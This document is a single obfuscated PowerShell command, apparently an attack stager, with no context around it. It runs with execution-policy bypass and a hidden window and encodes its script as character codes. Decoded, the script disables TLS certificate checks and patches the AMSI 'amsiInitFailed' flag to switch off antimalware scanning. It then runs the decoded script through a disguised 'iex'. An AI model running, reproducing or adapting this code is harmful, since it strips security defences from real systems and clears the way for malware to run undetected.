powershell.exe  -exec bypass -noni -nop -w 1 -C "('91Y78>101E116;46E83A101s114A118;105;99d101;80E111;105A110H116}77A97d110s97s103}101s114s93>58>58Y83H101s114s118H101Y114Y67Y101A114>116;105E102;105;99H97E116;101Y86A97}108}105H100s97H116;105H111Y110;67H97;108A108Y98E97H99>107Y32;61>32A123;36E116A114;117s101}125Y10A116}114;121s123d10s91A82d101;102Y93>46A65A115}115E101;109Y98H108Y121A46d71>101E116d84A121}112;101}40}39;83;121Y115;39s43}39;116E101H109Y46;77;97s110Y39;43Y39s97A103;101d109d101;110d116A46Y65d117Y116d39E43;39>111E109>97A116;105}111>110}46}65A109}39s43H39A115>105E85;116>39}43s39H105H108d115E39}41>46E71}101s116>70;105H101}108A100>40s39E97A109A39A43>39>115;105>73Y110E105;39>43A39;116A70}97Y105H108;101E100A39;44}32}39}78Y111H110s80;39Y43;39;117>98Y108;105;99>44s83;116d97d39E43>39;116}105H99A39;41s46Y83Y101>116E86Y97;108;117s101Y40d36A110d117d108A108E44s32;36A116Y114;117E101>41>10}125H99Y97H116H99H104s123}125}10Y36;80s83;86Y101H114;115d105}111Y110E84s97s98>108>101'.SPlIT('sY;AdE;}>H') | %% {([INt]$_-As[CHaR])}) -jOIN''| & ( ([stRiNG]$vErBoSEpREFEreNce)[1,3] + 'x'-JOin'')"
